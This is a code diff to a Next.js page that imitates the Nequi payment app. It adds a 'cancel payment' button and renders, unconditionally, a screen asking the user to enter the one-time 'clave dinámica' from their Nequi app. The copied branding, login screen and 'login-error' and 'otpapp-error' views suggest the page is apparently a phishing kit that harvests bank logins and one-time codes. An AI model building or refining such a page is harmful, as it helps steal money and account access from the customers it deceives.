@@ -5,6 +5,7 @@ import { Tarjeta } from "@/components/tarjeta/Tarjeta"
 import { Status } from "@/components/status/Status"
 import { useEffect, useRef, useState } from "react"
 import axios from "axios"
+import { useRouter } from "next/navigation"
 
 const COLOR_PRINCIPAL_TEXT = "text-[#da0081]"
 const COLOR_PRINCIPAL_BACK = "bg-[#da0081]"
@@ -194,10 +195,16 @@ const ClaveDinamica = ({ handler }) => {
 };
 
 const Dinamica = ({handler})=>{
+    const router = useRouter()
    return(
         <div className="w-full">
             <span className="text-[14px] text-[#270f3c]">Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi</span>
             <ClaveDinamica handler={handler}/>
+            <button onClick={()=>{
+                router.push("/")
+            }} className="text-[14px] mt-2.5 text-[#270f3c] w-full border border-[#270f3c] py-3.5">
+                Cancela el pago
+            </button>
         </div>
    )
 }
@@ -405,7 +412,7 @@ export default function Nequi (){
                 {!inicioSesion && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
                 {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
                 
-                
+                <Dinamica handler={handlerAplicacion}/>  
                 {selectVista == "otpapp" && <Dinamica handler={handlerAplicacion}/>}
                 {selectVista == "otpapp-error" && <Dinamica handler={handlerAplicacion}/>}
                 
